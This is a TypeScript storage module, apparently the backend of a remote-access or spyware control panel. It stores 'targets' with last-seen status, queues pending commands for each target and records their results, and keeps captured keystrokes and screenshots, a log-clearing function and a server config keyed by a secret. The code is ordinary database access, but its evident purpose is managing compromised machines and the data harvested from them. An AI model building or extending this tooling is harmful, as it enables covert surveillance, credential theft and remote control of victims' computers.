import { 
  type User, type InsertUser, 
  type ServerConfig, type InsertServerConfig,
  type Target, type InsertTarget,
  type Log, type InsertLog,
  type Command, type InsertCommand,
  type Keystroke, type InsertKeystroke,
  type Screenshot, type InsertScreenshot,
  users, serverConfig, targets, logs, commands, keystrokes, screenshots,
  generateUniqueCode
} from "@shared/schema";
import { db } from "./db";
import { eq, desc, and } from "drizzle-orm";

export interface IStorage {
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  
  getServerConfig(): Promise<ServerConfig | undefined>;
  getServerConfigByPortAndKey(port: number, secretKey: string): Promise<ServerConfig | undefined>;
  createServerConfig(config: InsertServerConfig): Promise<ServerConfig>;
  updateServerConfig(id: string, config: Partial<InsertServerConfig>): Promise<ServerConfig | undefined>;
  
  getTargets(): Promise<Target[]>;
  getTarget(id: string): Promise<Target | undefined>;
  getTargetByTargetId(targetId: string): Promise<Target | undefined>;
  getTargetByUniqueCode(uniqueCode: string): Promise<Target | undefined>;
  createTarget(target: InsertTarget): Promise<Target>;
  updateTarget(id: string, data: Partial<InsertTarget>): Promise<Target | undefined>;
  updateTargetStatus(id: string, status: string): Promise<Target | undefined>;
  deleteTarget(id: string): Promise<boolean>;
  
  getCommands(targetId: string): Promise<Command[]>;
  getPendingCommands(targetId: string): Promise<Command[]>;
  createCommand(command: InsertCommand): Promise<Command>;
  updateCommandStatus(id: string, status: string, result?: string): Promise<Command | undefined>;
  
  getLogs(limit?: number): Promise<Log[]>;
  getLogsByTarget(targetId: string, limit?: number): Promise<Log[]>;
  createLog(log: InsertLog): Promise<Log>;
  clearLogs(): Promise<void>;
  
  getKeystrokes(targetId: string, limit?: number): Promise<Keystroke[]>;
  createKeystroke(keystroke: InsertKeystroke): Promise<Keystroke>;
  
  getScreenshots(targetId: string, limit?: number): Promise<Screenshot[]>;
  createScreenshot(screenshot: InsertScreenshot): Promise<Screenshot>;
}

export class DatabaseStorage implements IStorage {
  async getUser(id: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.id, id));
    return user;
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.username, username));
    return user;
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const [user] = await db.insert(users).values(insertUser).returning();
    return user;
  }

  async getServerConfig(): Promise<ServerConfig | undefined> {
    const [config] = await db.select().from(serverConfig).where(eq(serverConfig.isActive, true));
    return config;
  }

  async getServerConfigByPortAndKey(port: number, secretKey: string): Promise<ServerConfig | undefined> {
    const [config] = await db.select().from(serverConfig).where(
      and(
        eq(serverConfig.port, port),
        eq(serverConfig.secretKey, secretKey),
        eq(serverConfig.isActive, true)
      )
    );
    return config;
  }

  async createServerConfig(config: InsertServerConfig): Promise<ServerConfig> {
    const [newConfig] = await db.insert(serverConfig).values(config).returning();
    return newConfig;
  }

  async updateServerConfig(id: string, config: Partial<InsertServerConfig>): Promise<ServerConfig | undefined> {
    const [updated] = await db.update(serverConfig).set(config).where(eq(serverConfig.id, id)).returning();
    return updated;
  }

  async getTargets(): Promise<Target[]> {
    return db.select().from(targets).orderBy(desc(targets.lastSeen));
  }

  async getTarget(id: string): Promise<Target | undefined> {
    const [target] = await db.select().from(targets).where(eq(targets.id, id));
    return target;
  }

  async getTargetByTargetId(targetId: string): Promise<Target | undefined> {
    const [target] = await db.select().from(targets).where(eq(targets.targetId, targetId));
    return target;
  }

  async getTargetByUniqueCode(uniqueCode: string): Promise<Target | undefined> {
    const [target] = await db.select().from(targets).where(eq(targets.uniqueCode, uniqueCode));
    return target;
  }

  async createTarget(target: InsertTarget): Promise<Target> {
    const targetWithCode = {
      ...target,
      uniqueCode: target.uniqueCode || generateUniqueCode(),
    };
    const [newTarget] = await db.insert(targets).values(targetWithCode).returning();
    return newTarget;
  }

  async updateTarget(id: string, data: Partial<InsertTarget>): Promise<Target | undefined> {
    const [updated] = await db.update(targets).set(data).where(eq(targets.id, id)).returning();
    return updated;
  }

  async updateTargetStatus(id: string, status: string): Promise<Target | undefined> {
    const [updated] = await db.update(targets).set({ status, lastSeen: new Date() }).where(eq(targets.id, id)).returning();
    return updated;
  }

  async deleteTarget(id: string): Promise<boolean> {
    await db.delete(targets).where(eq(targets.id, id));
    return true;
  }

  async getCommands(targetId: string): Promise<Command[]> {
    return db.select().from(commands).where(eq(commands.targetId, targetId)).orderBy(desc(commands.createdAt));
  }

  async getPendingCommands(targetId: string): Promise<Command[]> {
    return db.select().from(commands).where(
      and(eq(commands.targetId, targetId), eq(commands.status, 'pending'))
    ).orderBy(commands.createdAt);
  }

  async createCommand(command: InsertCommand): Promise<Command> {
    const [newCommand] = await db.insert(commands).values(command).returning();
    return newCommand;
  }

  async updateCommandStatus(id: string, status: string, result?: string): Promise<Command | undefined> {
    const updateData: any = { status };
    if (result) updateData.result = result;
    if (status === 'completed' || status === 'failed') {
      updateData.executedAt = new Date();
    }
    const [updated] = await db.update(commands).set(updateData).where(eq(commands.id, id)).returning();
    return updated;
  }

  async getLogs(limit: number = 100): Promise<Log[]> {
    return db.select().from(logs).orderBy(desc(logs.createdAt)).limit(limit);
  }

  async getLogsByTarget(targetId: string, limit: number = 100): Promise<Log[]> {
    return db.select().from(logs).where(eq(logs.targetId, targetId)).orderBy(desc(logs.createdAt)).limit(limit);
  }

  async createLog(log: InsertLog): Promise<Log> {
    const [newLog] = await db.insert(logs).values(log).returning();
    return newLog;
  }

  async clearLogs(): Promise<void> {
    await db.delete(logs);
  }

  async getKeystrokes(targetId: string, limit: number = 100): Promise<Keystroke[]> {
    return db.select().from(keystrokes).where(eq(keystrokes.targetId, targetId)).orderBy(desc(keystrokes.createdAt)).limit(limit);
  }

  async createKeystroke(keystroke: InsertKeystroke): Promise<Keystroke> {
    const [newKeystroke] = await db.insert(keystrokes).values(keystroke).returning();
    return newKeystroke;
  }

  async getScreenshots(targetId: string, limit: number = 10): Promise<Screenshot[]> {
    return db.select().from(screenshots).where(eq(screenshots.targetId, targetId)).orderBy(desc(screenshots.createdAt)).limit(limit);
  }

  async createScreenshot(screenshot: InsertScreenshot): Promise<Screenshot> {
    const [newScreenshot] = await db.insert(screenshots).values(screenshot).returning();
    return newScreenshot;
  }
}

export const storage = new DatabaseStorage();
